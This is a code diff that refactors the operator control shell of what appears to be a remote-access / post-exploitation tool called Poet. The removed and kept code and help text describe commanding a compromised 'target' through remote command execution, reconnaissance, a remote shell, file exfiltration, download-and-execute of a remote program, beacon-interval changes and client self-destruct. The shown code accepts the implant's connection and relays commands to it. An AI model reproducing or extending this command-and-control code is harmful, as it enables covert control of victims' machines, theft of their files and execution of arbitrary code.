@@ -1,7 +1,6 @@
 #!/usr/bin/python2.7
 
 import os
-import re
 import sys
 import zlib
 import base64
@@ -9,7 +8,6 @@ import socket
 import os.path
 import argparse
 from datetime import datetime
-from importlib import import_module
 
 import debug
 import module
@@ -54,59 +52,12 @@ class PoetServer(object):
     def __init__(self, s):
         self.s = s
         self.conn = None
-        # self.cmds = ['exit', 'help', 'exec', 'recon', 'shell', 'exfil',
-        #              'selfdestruct', 'dlexec', 'chint']
-        self.builtins = ['exit', 'help', 'chint']
-
+        self.builtins = ['exit', 'help']
         # exists so modules can stop server (used by selfdestruct)
         self.continue_ = True
 
     def start(self):
         """Poet server control shell."""
-        """
-                # exec
-                elif base == self.cmds[2]:
-                    inp += ' '  # for regex
-                    exec_regex = '^exec(\s+-o(\s+[\w.]+)?)?\s+(("[^"]+")\s+)+$'
-                    if re.search(exec_regex, inp):
-                        self.generic(*self.exec_preproc(inp))
-                    else:
-                        self.cmd_help(2)
-                # recon
-                elif base == self.cmds[3]:
-                    if re.search('^recon(\s+-o(\s+[\w.]+)?)?$', inp):
-                        if '-o' in inp.split():
-                            if len(inp.split()) == 3:
-                                self.generic(base, True, inp.split()[2])
-                            else:
-                                self.generic(base, True)
-                        else:
-                            self.generic(base)
-                    else:
-                        self.cmd_help(3)
-                # selfdestruct
-                elif base == self.cmds[6]:
-                    if inp == 'selfdestruct':
-                        print [!] WARNING: You are about to permanently remove the client from the target.
-    You will immediately lose access to the target. Continue? (y/n),
-                        if raw_input().lower()[0] == 'y':
-                            resp = self.conn.exchange('selfdestruct')
-                            if resp == 'boom':
-                                debug.info('Exiting control shell')
-                                return
-                            else:
-                                print 'posh : Self destruct error: {}'.format(resp)
-                        else:
-                            print 'posh : Aborting self destruct.'
-                    else:
-                        self.cmd_help(6)
-                # chint
-                elif base == self.cmds[8]:
-                    if re.search('^chint(\s+\d+)?$', inp):
-                        self.chint(inp)
-                    else:
-                        self.cmd_help(8)
-            """
 
         debug.info('Entering control shell')
         self.conn = PoetSocket(self.s.accept()[0])
@@ -117,16 +68,21 @@ class PoetServer(object):
                 found = False
                 argv = raw_input(POSH_PROMPT).split()
 
+                #
                 # builtins
+                #
+
                 if argv == []:
                     continue
-                # exit
                 if argv[0] == 'exit':
                     break
-                # help
                 elif argv[0] == 'help':
                     found = True
                     print 'Commands:\n  {}'.format('\n  '.join(sorted(self.builtins + module.server_commands.keys())))
+
+                #
+                # modules
+                #
 
                 # try to find command in registered modules
                 for cmd, func in module.server_commands.iteritems():
@@ -137,7 +93,7 @@ class PoetServer(object):
                         except Exception as e:
                             self.info(str(e.args))
 
-                # see comment above for self._continue for why this is here
+                # see comment above for self.continue_ for why this is here
                 if not self.continue_:
                     return
 
@@ -159,13 +115,15 @@ class PoetServer(object):
         """Abstraction layer for exchanging with client and writing to file.
 
         Args:
-            reg: command to send to client
+            req: command to send to client
             write_flag: whether client response should be written
             write_file: optional filename to use for file
         """
 
         resp = self.conn.exchange(req)
-        # TODO: this hardcoding is bad
+        # TODO: this hardcoding is bad, should be some generic way to see
+        # if response should be decompressed. maybe a list of all keywords
+        # which cause a compressed response to come back
         if req == 'recon':
             resp = zlib.decompress(resp)
         print resp
@@ -216,55 +174,6 @@ class PoetServer(object):
             f.write(response)
             print 'posh : {} written to {}'.format(prefix, outfile)
 
-    def cmd_help(self, ind):
-        """Print help messages for posh commands."""
-
-        if ind == 2:
-            print 'Execute commands on target.'
-            print 'usage: exec [-o [filename]] "cmd1" ["cmd2" "cmd3" ...]'
-            print '\nExecute given commands and optionally log to file with optional filename.'
-            print '\noptions:'
-            print '-h\t\tshow help'
-            print '-o filename\twrite results to file in {}/'.format(OUT)
-        elif ind == 3:
-            print 'Basic reconaissance of target.'
-            print 'usage: recon [-h] [-o]'
-            print '\nExecutes, whoami, id, w, who -a, uname -a, and lsb_release -a on target where applicable.'
-            print '\noptions:'
-            print '-h\t\tshow help'
-            print '-o\t\twrite results to file in {}/'.format(OUT)
-        elif ind == 4:
-            print 'Remote shell on target.'
-            print 'usage: shell [-h]'
-            print '\noptions:'
-            print '-h\t\tshow help'
-        elif ind == 5:
-            print 'Exfiltrate files.'
-            print 'usage: exfil [-h] file1 [file2 file3 ...]'
-            print '\nDownloads files to {}/'.format(OUT)
-            print '\noptions:'
-            print '-h\t\tshow help'
-        elif ind == 6:
-            print 'Self destruct.'
-            print 'usage: selfdestruct [-h]'
-            print '\nPermanently remove client from target.'
-            print '\noptions:'
-            print '-h\t\tshow help'
-        elif ind == 7:
-            print 'Download and execute.'
-            print 'usage: dlexec [-h] http://my.pro/gram'
-            print '\nDownload executable from internet and execute.'
-            print '\noptions:'
-            print '-h\t\tshow help'
-        elif ind == 8:
-            print 'Print or change client delay interval.'
-            print 'usage: chint [-h] [seconds]'
-            print '\nIf run with no arguments, print the current client delay.'
-            print 'Otherwise, change interval to given argument (seconds).'
-            print 'Minimum allowed value is 1.'
-            print '\noptions:'
-            print '-h\t\tshow help'
-
     def exec_preproc(self, inp):
         """Parse posh `exec' command line.
 
@@ -285,30 +194,6 @@ class PoetServer(object):
             del tmp[1]
         tmp = ' '.join(tmp)
         return tmp, write_flag, write_file
-
-    def chint(self, argv):
-        """Chint command handler.
-
-        Args:
-            inp: input string
-        """
-
-        if len(argv) > 1:
-            # argument was given
-            try:
-                num = int(argv[1])
-            except ValueError:
-                self.cmd_help(8)
-                return
-            if num < 1:
-                self.info('Invalid interval time')
-            else:
-                resp = self.conn.exchange(' '.join(argv))
-                msg = 'successful' if resp == 'done' else 'error: ' + resp
-                self.info('chint ({}) {}'.format(num, msg))
-        else:
-            # no argument
-            print self.conn.exchange(argv[0])
 
 
 def get_args():
